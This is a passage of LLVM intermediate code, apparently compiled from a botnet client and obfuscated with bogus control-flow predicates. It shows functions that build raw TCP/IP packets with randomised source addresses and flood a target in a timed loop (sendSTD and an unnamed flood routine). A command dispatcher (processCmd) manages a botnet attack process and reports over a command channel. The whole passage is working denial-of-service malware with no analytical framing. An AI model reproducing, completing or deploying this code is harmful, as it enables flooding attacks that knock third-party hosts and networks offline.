  br i1 %426, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %448

; <label>:427:                                    ; preds = %392
  %428 = load i32, i32* @x.99
  %429 = load i32, i32* @y.100
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %427
  %436 = load i32, i32* %9, align 4
  %437 = trunc i32 %436 to i16
  %438 = call zeroext i16 @htons(i16 zeroext %437) #10
  %439 = zext i16 %438 to i32
  %440 = load i32, i32* @x.99
  %441 = load i32, i32* @y.100
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %448

; <label>:448:                                    ; preds = %originalBBpart2134, %originalBBpart2130
  %449 = phi i32 [ %418, %originalBBpart2130 ], [ %439, %originalBBpart2134 ]
  %450 = trunc i32 %449 to i16
  %451 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  %453 = bitcast %union.anon* %452 to %struct.anon.0*
  %454 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %453, i32 0, i32 1
  store i16 %450, i16* %454, align 2
  %455 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %456 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %457 = call zeroext i16 @tcpcsum(%struct.iphdr* %455, %struct.tcphdr* %456)
  %458 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %459 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %458, i32 0, i32 0
  %460 = bitcast %union.anon* %459 to %struct.anon.0*
  %461 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %460, i32 0, i32 6
  store i16 %457, i16* %461, align 4
  %462 = bitcast i8* %133 to i16*
  %463 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 2
  %465 = load i16, i16* %464, align 2
  %466 = zext i16 %465 to i32
  %467 = call zeroext i16 @csum(i16* %462, i32 %466)
  %468 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %468, i32 0, i32 7
  store i16 %467, i16* %469, align 2
  %470 = call i64 @time(i64* null) #3
  %471 = load i32, i32* %10, align 4
  %472 = sext i32 %471 to i64
  %473 = add nsw i64 %470, %472
  %474 = trunc i64 %473 to i32
  store i32 %474, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %475

; <label>:475:                                    ; preds = %577, %originalBBpart2146, %448
  %476 = load i32, i32* @x.99
  %477 = load i32, i32* @y.100
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %475
  %484 = load i32, i32* @x.99
  %485 = load i32, i32* @y.100
  %486 = sub i32 %484, 1
  %487 = mul i32 %484, %486
  %488 = urem i32 %487, 2
  %489 = icmp eq i32 %488, 0
  %490 = icmp slt i32 %485, 10
  %491 = or i1 %489, %490
  br i1 %491, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br label %492

; <label>:492:                                    ; preds = %originalBBpart2138
  %493 = load i32, i32* %17, align 4
  %494 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %495 = call i64 @sendto(i32 %493, i8* %133, i64 %131, i32 0, %struct.sockaddr* %494, i32 16)
  %496 = load i32, i32* %19, align 4
  %497 = call i32 @GRIP(i32 %496)
  %498 = call i32 @htonl(i32 %497) #10
  %499 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 8
  store i32 %498, i32* %500, align 4
  %501 = call i32 @rand_cmwc()
  %502 = trunc i32 %501 to i16
  %503 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %504 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %503, i32 0, i32 3
  store i16 %502, i16* %504, align 4
  %505 = call i32 @rand_cmwc()
  %506 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 0
  %508 = bitcast %union.anon* %507 to %struct.anon.0*
  %509 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %508, i32 0, i32 2
  store i32 %505, i32* %509, align 4
  %510 = call i32 @rand_cmwc()
  %511 = trunc i32 %510 to i16
  %512 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 0
  %514 = bitcast %union.anon* %513 to %struct.anon.0*
  %515 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %514, i32 0, i32 0
  store i16 %511, i16* %515, align 4
  %516 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %517 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %516, i32 0, i32 0
  %518 = bitcast %union.anon* %517 to %struct.anon.0*
  %519 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %518, i32 0, i32 6
  store i16 0, i16* %519, align 4
  %520 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %521 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %522 = call zeroext i16 @tcpcsum(%struct.iphdr* %520, %struct.tcphdr* %521)
  %523 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %524 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %523, i32 0, i32 0
  %525 = bitcast %union.anon* %524 to %struct.anon.0*
  %526 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %525, i32 0, i32 6
  store i16 %522, i16* %526, align 4
  %527 = bitcast i8* %133 to i16*
  %528 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 2
  %530 = load i16, i16* %529, align 2
  %531 = zext i16 %530 to i32
  %532 = call zeroext i16 @csum(i16* %527, i32 %531)
  %533 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %534 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %533, i32 0, i32 7
  store i16 %532, i16* %534, align 2
  %535 = load i32, i32* %25, align 4
  %536 = load i32, i32* %15, align 4
  %537 = icmp eq i32 %535, %536
  br i1 %537, label %538, label %577

; <label>:538:                                    ; preds = %492
  %539 = load i32, i32* @x.99
  %540 = load i32, i32* @y.100
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %538
  %547 = call i64 @time(i64* null) #3
  %548 = load i32, i32* %24, align 4
  %549 = sext i32 %548 to i64
  %550 = icmp sgt i64 %547, %549
  %551 = load i32, i32* @x.99
  %552 = load i32, i32* @y.100
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br i1 %550, label %559, label %560

; <label>:559:                                    ; preds = %originalBBpart2142
  br label %580

; <label>:560:                                    ; preds = %originalBBpart2142
  %561 = load i32, i32* @x.99
  %562 = load i32, i32* @y.100
  %563 = sub i32 %561, 1
  %564 = mul i32 %561, %563
  %565 = urem i32 %564, 2
  %566 = icmp eq i32 %565, 0
  %567 = icmp slt i32 %562, 10
  %568 = or i1 %566, %567
  br i1 %568, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %560
  store i32 0, i32* %25, align 4
  %569 = load i32, i32* @x.99
  %570 = load i32, i32* @y.100
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br label %475

; <label>:577:                                    ; preds = %492
  %578 = load i32, i32* %25, align 4
  %579 = add i32 %578, 1
  store i32 %579, i32* %25, align 4
  br label %475

; <label>:580:                                    ; preds = %559
  %581 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %581)
  br label %582

; <label>:582:                                    ; preds = %580, %91, %67, %44
  %583 = load i32, i32* @x.99
  %584 = load i32, i32* @y.100
  %585 = sub i32 %583, 1
  %586 = mul i32 %583, %585
  %587 = urem i32 %586, 2
  %588 = icmp eq i32 %587, 0
  %589 = icmp slt i32 %584, 10
  %590 = or i1 %588, %589
  br i1 %590, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %582
  %591 = load i32, i32* @x.99
  %592 = load i32, i32* @y.100
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %45
  %599 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %600 = getelementptr inbounds [8 x i8], [8 x i8]* %599, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %600, i8 0, i64 8, i32 4, i1 false)
  %601 = call i32 @socket(i32 2, i32 3, i32 6) #3
  store i32 %601, i32* %17, align 4
  %602 = load i32, i32* %17, align 4
  %603 = icmp ne i32 %602, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  store i32 1, i32* %18, align 4
  %604 = load i32, i32* %17, align 4
  %605 = bitcast i32* %18 to i8*
  %606 = call i32 @setsockopt(i32 %604, i32 0, i32 3, i8* %605, i32 4) #3
  %607 = icmp slt i32 %606, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %98
  %608 = load i32, i32* %11, align 4
  %_ = sub i32 0, 32
  %gen = add i32 %_, %608
  %_7 = sub i32 32, %608
  %gen8 = mul i32 %_7, %608
  %_9 = shl i32 32, %608
  %_10 = sub i32 32, %608
  %gen11 = mul i32 %_10, %608
  %_12 = sub i32 0, 32
  %gen13 = add i32 %_12, %608
  %_14 = shl i32 32, %608
  %609 = sub nsw i32 32, %608
  %_15 = shl i32 1, %609
  %_16 = sub i32 0, 1
  %gen17 = add i32 %_16, %609
  %_18 = sub i32 0, 1
  %gen19 = add i32 %_18, %609
  %_20 = shl i32 1, %609
  %610 = shl i32 1, %609
  %_21 = sub i32 0, %610
  %gen22 = add i32 %_21, 1
  %_23 = shl i32 %610, 1
  %_24 = sub i32 %610, 1
  %gen25 = mul i32 %_24, 1
  %_26 = sub i32 %610, 1
  %gen27 = mul i32 %_26, 1
  %_28 = sub i32 0, %610
  %gen29 = add i32 %_28, 1
  %_30 = sub i32 %610, 1
  %gen31 = mul i32 %_30, 1
  %_32 = sub i32 %610, 1
  %gen33 = mul i32 %_32, 1
  %_34 = sub i32 %610, 1
  %gen35 = mul i32 %_34, 1
  %611 = sub nsw i32 %610, 1
  %_36 = sub i32 %611, -1
  %gen37 = mul i32 %_36, -1
  %_38 = sub i32 %611, -1
  %gen39 = mul i32 %_38, -1
  %_40 = sub i32 %611, -1
  %gen41 = mul i32 %_40, -1
  %_42 = sub i32 %611, -1
  %gen43 = mul i32 %_42, -1
  %_44 = shl i32 %611, -1
  %_45 = sub i32 %611, -1
  %gen46 = mul i32 %_45, -1
  %_47 = shl i32 %611, -1
  %612 = xor i32 %611, -1
  store i32 %612, i32* %19, align 4
  br label %originalBB6

originalBB51alteredBB:                            ; preds = %originalBB51, %120
  %613 = load i32, i32* %13, align 4
  %614 = sext i32 %613 to i64
  %_52 = sub i64 40, %614
  %gen53 = mul i64 %_52, %614
  %_54 = sub i64 0, 40
  %gen55 = add i64 %_54, %614
  %_56 = shl i64 40, %614
  %_57 = sub i64 40, %614
  %gen58 = mul i64 %_57, %614
  %615 = add i64 40, %614
  %616 = call i8* @llvm.stacksave()
  store i8* %616, i8** %20, align 8
  %617 = alloca i8, i64 %615, align 16
  %618 = bitcast i8* %617 to %struct.iphdr*
  store %struct.iphdr* %618, %struct.iphdr** %21, align 8
  %619 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %620 = bitcast %struct.iphdr* %619 to i8*
  %621 = getelementptr i8, i8* %620, i64 20
  %622 = bitcast i8* %621 to %struct.tcphdr*
  store %struct.tcphdr* %622, %struct.tcphdr** %22, align 8
  %623 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %624 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %625 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %624, i32 0, i32 0
  %626 = load i32, i32* %625, align 4
  %627 = load i32, i32* %19, align 4
  %628 = call i32 @GRIP(i32 %627)
  %629 = call i32 @htonl(i32 %628) #10
  %630 = load i32, i32* %13, align 4
  %631 = sext i32 %630 to i64
  %_59 = sub i64 20, %631
  %gen60 = mul i64 %_59, %631
  %632 = add i64 20, %631
  %633 = trunc i64 %632 to i32
  call void @makeIPPacket(%struct.iphdr* %623, i32 %626, i32 %629, i8 zeroext 6, i32 %633)
  %634 = call i32 @rand_cmwc()
  %635 = trunc i32 %634 to i16
  %636 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %637 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %636, i32 0, i32 0
  %638 = bitcast %union.anon* %637 to %struct.anon.0*
  %639 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %638, i32 0, i32 0
  store i16 %635, i16* %639, align 4
  %640 = call i32 @rand_cmwc()
  %641 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %642 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %641, i32 0, i32 0
  %643 = bitcast %union.anon* %642 to %struct.anon.0*
  %644 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %643, i32 0, i32 2
  store i32 %640, i32* %644, align 4
  %645 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %646 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %645, i32 0, i32 0
  %647 = bitcast %union.anon* %646 to %struct.anon.0*
  %648 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %647, i32 0, i32 3
  store i32 0, i32* %648, align 4
  %649 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %650 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %649, i32 0, i32 0
  %651 = bitcast %union.anon* %650 to %struct.anon.0*
  %652 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %651, i32 0, i32 4
  %653 = load i16, i16* %652, align 4
  %_61 = shl i16 %653, -241
  %_62 = sub i16 %653, -241
  %gen63 = mul i16 %_62, -241
  %654 = and i16 %653, -241
  %_64 = sub i16 %654, 80
  %gen65 = mul i16 %_64, 80
  %655 = or i16 %654, 80
  store i16 %655, i16* %652, align 4
  %656 = load i8*, i8** %12, align 8
  %657 = call i32 @strcmp(i8* %656, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.119, i32 0, i32 0)) #9
  %658 = icmp ne i32 %657, 0
  br label %originalBB51

originalBB69alteredBB:                            ; preds = %originalBB69, %222
  %659 = load i8*, i8** %23, align 8
  %660 = icmp ne i8* %659, null
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %257
  %661 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %662 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %661, i32 0, i32 0
  %663 = bitcast %union.anon* %662 to %struct.anon.0*
  %664 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %663, i32 0, i32 4
  %665 = load i16, i16* %664, align 4
  %_74 = shl i16 %665, -1025
  %_75 = sub i16 0, %665
  %gen76 = add i16 %_75, -1025
  %_77 = sub i16 %665, -1025
  %gen78 = mul i16 %_77, -1025
  %666 = and i16 %665, -1025
  %_79 = sub i16 %666, 1024
  %gen80 = mul i16 %_79, 1024
  %_81 = sub i16 %666, 1024
  %gen82 = mul i16 %_81, 1024
  %_83 = sub i16 %666, 1024
  %gen84 = mul i16 %_83, 1024
  %_85 = sub i16 %666, 1024
  %gen86 = mul i16 %_85, 1024
  %_87 = shl i16 %666, 1024
  %_88 = sub i16 0, %666
  %gen89 = add i16 %_88, 1024
  %667 = or i16 %666, 1024
  store i16 %667, i16* %664, align 4
  br label %originalBB73

originalBB93alteredBB:                            ; preds = %originalBB93, %281
  %668 = load i8*, i8** %23, align 8
  %669 = call i32 @strcmp(i8* %668, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.123, i32 0, i32 0)) #9
  %670 = icmp ne i32 %669, 0
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %301
  %671 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %672 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %671, i32 0, i32 0
  %673 = bitcast %union.anon* %672 to %struct.anon.0*
  %674 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %673, i32 0, i32 4
  %675 = load i16, i16* %674, align 4
  %_98 = sub i16 %675, -257
  %gen99 = mul i16 %_98, -257
  %_100 = sub i16 %675, -257
  %gen101 = mul i16 %_100, -257
  %_102 = shl i16 %675, -257
  %_103 = sub i16 %675, -257
  %gen104 = mul i16 %_103, -257
  %676 = and i16 %675, -257
  %_105 = sub i16 0, %676
  %gen106 = add i16 %_105, 256
  %_107 = shl i16 %676, 256
  %_108 = sub i16 0, %676
  %gen109 = add i16 %_108, 256
  %_110 = sub i16 0, %676
  %gen111 = add i16 %_110, 256
  %_112 = shl i16 %676, 256
  %_113 = sub i16 %676, 256
  %gen114 = mul i16 %_113, 256
  %_115 = sub i16 0, %676
  %gen116 = add i16 %_115, 256
  %677 = or i16 %676, 256
  store i16 %677, i16* %674, align 4
  br label %originalBB97

originalBB120alteredBB:                           ; preds = %originalBB120, %337
  %678 = load i8*, i8** %23, align 8
  %679 = call i32 @strcmp(i8* %678, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.125, i32 0, i32 0)) #9
  %680 = icmp ne i32 %679, 0
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %365
  %681 = load i32, i32* @KadenCommStock, align 4
  %682 = load i8*, i8** %23, align 8
  %683 = call i32 (i32, i8*, ...) @botnetPrint(i32 %681, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.126, i32 0, i32 0), i8* %682)
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %409
  %684 = call i32 @rand_cmwc()
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %427
  %685 = load i32, i32* %9, align 4
  %686 = trunc i32 %685 to i16
  %687 = call zeroext i16 @htons(i16 zeroext %686) #10
  %688 = zext i16 %687 to i32
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %475
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %538
  %689 = call i64 @time(i64* null) #3
  %690 = load i32, i32* %24, align 4
  %691 = sext i32 %690 to i64
  %692 = icmp sgt i64 %689, %691
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %560
  store i32 0, i32* %25, align 4
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %582
  br label %originalBB148
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8*], align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #3
  store i32 %13, i32* %7, align 4
  %14 = call i64 @time(i64* null) #3
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #3
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  br label %37

; <label>:37:                                     ; preds = %originalBBpart26, %3
  %38 = bitcast [1 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %38, i8* bitcast ([1 x i8*]* @sendSTD.hexstring to i8*), i64 8, i32 8, i1 false)
  %39 = load i32, i32* %11, align 4
  %40 = icmp uge i32 %39, 50
  br i1 %40, label %41, label %75

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %7, align 4
  %43 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i32 0, i32 0
  %44 = bitcast i8** %43 to i8*
  %45 = call i64 @send(i32 %42, i8* %44, i64 1460, i32 0)
  %46 = load i32, i32* %7, align 4
  %47 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %48 = call i32 @connect(i32 %46, %struct.sockaddr* %47, i32 16)
  %49 = call i64 @time(i64* null) #3
  %50 = load i64, i64* %8, align 8
  %51 = load i32, i32* %6, align 4
  %52 = sext i32 %51 to i64
  %53 = add nsw i64 %50, %52
  %54 = icmp sge i64 %49, %53
  br i1 %54, label %55, label %58

; <label>:55:                                     ; preds = %41
  %56 = load i32, i32* %7, align 4
  %57 = call i32 @close(i32 %56)
  call void @_exit(i32 0) #12
  unreachable

; <label>:58:                                     ; preds = %41
  %59 = load i32, i32* @x.101
  %60 = load i32, i32* @y.102
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %58
  store i32 0, i32* %11, align 4
  %67 = load i32, i32* @x.101
  %68 = load i32, i32* @y.102
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %75

; <label>:75:                                     ; preds = %originalBBpart2, %37
  %76 = load i32, i32* @x.101
  %77 = load i32, i32* @y.102
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  %84 = load i32, i32* %11, align 4
  %85 = add i32 %84, 1
  store i32 %85, i32* %11, align 4
  %86 = load i32, i32* @x.101
  %87 = load i32, i32* @y.102
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %37
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %58
  store i32 0, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  %95 = load i32, i32* %11, align 4
  %_ = sub i32 0, %95
  %gen = add i32 %_, 1
  %_2 = sub i32 %95, 1
  %gen3 = mul i32 %_2, 1
  %_4 = shl i32 %95, 1
  %96 = add i32 %95, 1
  store i32 %96, i32* %11, align 4
  br label %originalBB1
}

; Function Attrs: noreturn
declare void @_exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %31 = load i8**, i8*** %4, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @strcmp(i8* %33, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.128, i32 0, i32 0)) #9
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %170, label %36

; <label>:36:                                     ; preds = %2
  %37 = load i8**, i8*** %4, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.129, i32 0, i32 0)) #9
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %49, label %42

; <label>:42:                                     ; preds = %36
  %43 = load i32, i32* @botnetPid, align 4
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %42
  br label %1091

; <label>:46:                                     ; preds = %42
  %47 = load i32, i32* @botnetPid, align 4
  %48 = call i32 @kill(i32 %47, i32 9) #3
  store i32 0, i32* @botnetPid, align 4
  br label %49

; <label>:49:                                     ; preds = %46, %36
  %50 = load i32, i32* @x.103
  %51 = load i32, i32* @y.104
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %49
  %58 = load i8**, i8*** %4, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 1
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @strcmp(i8* %60, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.130, i32 0, i32 0)) #9
  %62 = icmp ne i32 %61, 0
  %63 = load i32, i32* @x.103
  %64 = load i32, i32* @y.104
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %62, label %153, label %71

; <label>:71:                                     ; preds = %originalBBpart2
  %72 = load i32, i32* @x.103
  %73 = load i32, i32* @y.104
